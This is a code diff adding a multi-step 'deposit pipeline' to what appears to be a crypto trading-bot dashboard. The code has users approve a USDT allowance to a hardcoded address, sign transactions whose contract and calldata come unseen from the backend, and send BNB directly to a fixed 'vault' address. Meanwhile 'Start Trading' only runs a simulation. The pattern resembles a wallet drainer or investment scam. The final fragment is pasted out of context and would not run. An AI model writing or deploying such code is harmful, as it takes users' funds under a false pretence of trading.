@@ -106,7 +106,6 @@ async function initDashboardPipeline() {
   }
 }
 initDashboardPipeline();
-
 // ========================================================
 // 📱 SECTION 2: STANDALONE RPC MODAL CONNECTION MANAGER
 // ========================================================
@@ -210,4 +209,194 @@ if (connBtn) {
     }
   };
 }
+// ========================================================
+// 🚀 SECTION 3: MULTI-STEP DEPOSIT PIPELINE ENGINE
+// ========================================================
+const depBtn = document.getElementById("depositBtn");
+if (depBtn) {
+  depBtn.onclick = async function () {
+    const token = getSelectedToken();
+    const amountInput = document.getElementById("depositAmount");
+    const rawAmt = parseFloat(amountInput?.value || 0);
 
+    if (isNaN(rawAmt) || rawAmt <= 0) {
+      return logToPanel("❌ Action Halted: Enter a valid positive deposit amount.");
+    }
+
+    const principalAmount = BigInt(Math.floor(rawAmt * 1e18));
+    const commissionBuffer = (principalAmount * 4n) / 10000n;
+    const totalAllowance = principalAmount + commissionBuffer;
+
+    const wallet = window.USER_ADDR;
+    if (!wallet || wallet === "{wallet}") {
+      return logToPanel("❌ Action Halted: Connect Web3 Wallet First.");
+    }
+    
+    // Safety check ensuring a provider channel is fully authorized
+    if (!window.activeProvider) {
+      return logToPanel("❌ Action Halted: Active communication channel missing. Connect Wallet again.");
+    }
+
+    try {
+      if (token === "USDT") {
+        const usdt = "0x55d398326f99059fF775485246999027B3197955";
+        const v12 = "0x1854170353ea89672638F9fa5acB477c45523871";
+
+        // =========================================================
+        // STEP 1/3: ERC20 ALLOWANCE APPROVAL (Total = Capital + Fee)
+        // =========================================================
+        logToPanel("⏳ Step 1/3: Requesting total USDT approval allowance via active wallet...");
+        const approveData = "0x095ea7b3" + 
+                            v12.replace("0x", "").padStart(64, "0") + 
+                            totalAllowance.toString(16).padStart(64, "0");
+
+        const txHash1 = await window.activeProvider.request({
+          method: "eth_sendTransaction",
+          params: [{ from: wallet, to: usdt, data: approveData }]
+        });
+        logToPanel(`📡 Step 1 Broadcasted! Hash: ${txHash1}. Initiating pipeline transitions...`);
+
+        // =========================================================
+        // STEP 2/3: SMART CONTRACT COMMISSION FEE COLLECTION
+        // =========================================================
+        logToPanel("⏳ Step 2/3: Fetching commission data metrics from ecosystem backend...");
+        const c1 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ amount: principalAmount.toString(), tradingPhase: false })
+        });
+        
+        if (!c1.ok) throw new Error(`Backend Error ${c1.status} inside commission setup.`);
+        const commissionPay = await c1.json();
+        if (commissionPay.status !== "ok") throw new Error(commissionPay.message);
+
+        logToPanel("🚀 Prompting Wallet Provider for Step 2/3 (Process Commission)...");
+        const txHash2 = await window.activeProvider.request({
+          method: "eth_sendTransaction",
+          params: [{ 
+            from: wallet, 
+            to: commissionPay.contract, 
+            data: commissionPay.txdata,
+            gas: "0x493E0" 
+          }]
+        });
+        logToPanel(`📡 Step 2 Broadcasted! Hash: ${txHash2}`);
+
+        // =========================================================
+        // STEP 3/3: FINAL TRADING CAPITAL DEPOSIT
+        // =========================================================
+        logToPanel("⏳ Step 3/3: Fetching final trading layout variables...");
+        const c2 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ amount: principalAmount.toString(), tradingPhase: true })
+        });
+        
+        if (!c2.ok) throw new Error(`Backend Error ${c2.status} inside trading structure setup.`);
+        const tradingPay = await c2.json();
+        if (tradingPay.status !== "ok") throw new Error(tradingPay.message);
+
+        logToPanel("🚀 Prompting Wallet Provider for Step 3/3 (Process Capital Deposit)...");
+        const txHash3 = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{ 
+            from: wallet, 
+            to: tradingPay.contract, 
+            data: tradingPay.txdata,
+            gas: "0x493E0" 
+          }]
+        });
+        logToPanel(`🎉 Step 3/3 Submitted! Capital Deposit Hash: ${txHash3}`);
+
+      } else if (token === "BNB") {
+        logToPanel("⏳ Transmitting native gas reserves directly to V13 vault...");
+        const txHashBnb = await window.activeProvider.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: wallet,
+            to: "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5", 
+            value: "0x" + principalAmount.toString(16)
+          }]
+        });
+        logToPanel(`✅ Native BNB gas vault transaction dispatched: ${txHashBnb}`);
+      }
+    } catch (err) {
+      logToPanel(`❌ Execution Engine Failure: ${err.message}`);
+    }
+  };
+}
+// ========================================================
+// ▶️ SECTION 4: SIMULATION ORCHESTRATOR & BALANCE FIXES
+// ========================================================
+const strtBtn = document.getElementById("startBtn");
+if (strtBtn) {
+  strtBtn.onclick = function() {
+    logToPanel("▶️ Start Trading clicked — launching simulation...");
+    if (typeof window.startSimulation === "function") {
+      window.startSimulation(10);
+    } else {
+      logToPanel("❌ Pipeline compiler error: startSimulation method missing.");
+    }
+  };
+}
+
+const stpBtn = document.getElementById("stopBtn");
+if (stpBtn) {
+  stpBtn.onclick = function() {
+    logToPanel("⏹ Safety Stop activated.");
+    if (typeof window.stopBot === "function") window.stopBot();
+  };
+}
+
+async function updateUIBalanceControl(user, token) {
+    try {
+        const baseApiUrl = window.API_BASE || window.location.origin;
+        if (!user || user === "{wallet}" || user === "null") {
+            return "0";
+        }
+
+        const res = await fetch(`${baseApiUrl}/prodbot/balance`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ user: user, token: token })
+        });
+        
+        const rawWeiText = await res.text();
+        const cleanWeiString = rawWeiText.trim() || "0";
+
+        const startInputBox = document.getElementById("startBalance");
+        const investInputBox = document.getElementById("investBalance");
+        
+        if (startInputBox) {
+            startInputBox.type = "text";
+            startInputBox.value = cleanWeiString;
+        }
+        if (investInputBox) {
+            investInputBox.type = "text";
+            investInputBox.value = cleanWeiString;
+        }
+        return cleanWeiString;
+    } catch (err) {
+        console.error("❌ Critical exception inside updateUIBalanceControl:", err);
+        return "0";
+    }
+}
+window.updateUIBalanceControl = updateUIBalanceControl;
+// ✅ UPGRADED SWAP BROADCASTER (pancake_prod.txt)
+if (data && data.status === "ok") {
+    logToPanel(`[INFO] Requesting secure signature from your verified active wallet...`);
+    
+    // Renders the signature popup screen natively on whichever device is paired (Mobile / Desktop)
+    const txHash = await window.activeProvider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+            from: userAddr,                            
+            to: data.to_contract,                      
+            data: data.compiled_data,                  
+            value: '0x0'                               
+        }],
+    });
+
+    logToPanel(`✅ Live Transaction Sent! Hash: ${txHash}`);
+    return { status: "ok", tx_hash: txHash, txHash: txHash };
+}
